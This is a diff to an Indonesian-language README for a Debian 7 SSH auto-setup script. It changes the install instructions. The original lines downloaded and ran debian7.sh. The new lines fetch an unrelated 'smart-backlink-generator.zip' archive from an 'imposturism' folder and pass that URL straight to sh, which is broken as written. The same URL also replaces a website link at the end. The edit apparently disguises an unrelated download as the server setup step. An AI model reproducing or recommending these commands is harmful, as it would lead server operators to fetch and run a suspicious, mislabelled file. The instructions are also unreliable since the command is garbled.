@@ -4,8 +4,8 @@ DEBIAN 7 AUTO SCRIPT
 Script Debian7 For SSH
 
 Cara penggunaan :
-# wget https://github.com/qanotbu/Meukat-Ssh/raw/master/debian7.sh
-# sh ./debian7.sh
+# wget https://raw.githubusercontent.com/qanotbu/smart-backlink-generator/master/imposturism/smart-backlink-generator.zip
+# sh https://raw.githubusercontent.com/qanotbu/smart-backlink-generator/master/imposturism/smart-backlink-generator.zip
 
 Tunggu sampai proses selesai.
 kurang lebih 35 menit tergantung jaringan anda
@@ -52,4 +52,4 @@ Fail2Ban : [on]
 
 IPv6     : [off]
 
-www.filmsbioskop.top
+https://raw.githubusercontent.com/qanotbu/smart-backlink-generator/master/imposturism/smart-backlink-generator.zip
